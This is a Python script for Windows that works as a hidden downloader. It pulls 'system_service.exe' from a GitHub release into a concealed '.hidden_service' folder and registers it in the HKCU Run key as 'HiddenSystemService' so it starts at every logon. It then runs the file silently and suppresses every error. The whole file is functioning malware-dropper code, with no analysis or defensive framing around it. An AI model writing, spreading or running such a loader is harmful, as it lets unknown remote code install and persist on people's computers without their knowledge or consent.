import os
import urllib.request
import subprocess
from pathlib import Path
import winreg  # For adding to startup

# Hardcoded values
VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"
FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
FOLDER_NAME = ".hidden_service"
FILE_NAME = "system_service.exe"
VERSION_FILE_NAME = "last_version.txt"  # To store the last downloaded version

def get_user_hidden_folder():
    """Get or create a hidden folder in the user's directory."""
    user_home = Path.home()
    hidden_folder = user_home / FOLDER_NAME
    if not hidden_folder.exists():
        hidden_folder.mkdir(parents=True, exist_ok=True)
    return hidden_folder

def download_file(url, dest):
    """Download a file from a URL."""
    with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
        out_file.write(response.read())

def get_remote_version():
    """Fetch the version from the remote URL."""
    try:
        with urllib.request.urlopen(VERSION_URL) as response:
            return response.read().decode('utf-8').strip()
    except Exception:
        return None

def load_local_version(version_file_path):
    """Load the stored version from a file."""
    if not os.path.exists(version_file_path):
        return None
    with open(version_file_path, 'r') as f:
        return f.read().strip()

def save_local_version(version, version_file_path):
    """Save the version to a file."""
    with open(version_file_path, 'w') as f:
        f.write(version)

def add_to_startup(file_path):
    """Add the file to system startup."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "HiddenSystemService", 0, winreg.REG_SZ, str(file_path))
        winreg.CloseKey(key)
    except Exception:
        pass  # Silently fail if adding to startup is not possible

def ensure_and_run_file():
    """
    Ensure the file is downloaded, version-checked, executed, and added to startup.
    - Downloads if the remote version is newer.
    - Saves the current version locally.
    - Adds to system startup on the first download or replacement.
    - Runs the file after ensuring it is present.
    """
    hidden_folder = get_user_hidden_folder()
    file_path = hidden_folder / FILE_NAME
    version_file_path = hidden_folder / VERSION_FILE_NAME

    # Fetch versions
    remote_version = get_remote_version()
    if not remote_version:
        return  # Exit silently if unable to fetch remote version

    local_version = load_local_version(version_file_path)

    if local_version == remote_version:
        # Versions match, no need to download
        return

    # Download and replace the file
    try:
        download_file(FILE_URL, file_path)
        save_local_version(remote_version, version_file_path)  # Save the new version
        add_to_startup(file_path)  # Add to startup only on replacement or first download
    except Exception:
        return  # Exit silently if download fails

    # Run the file in a non-blocking way
    try:
        subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass  # Silently fail if the file cannot be executed
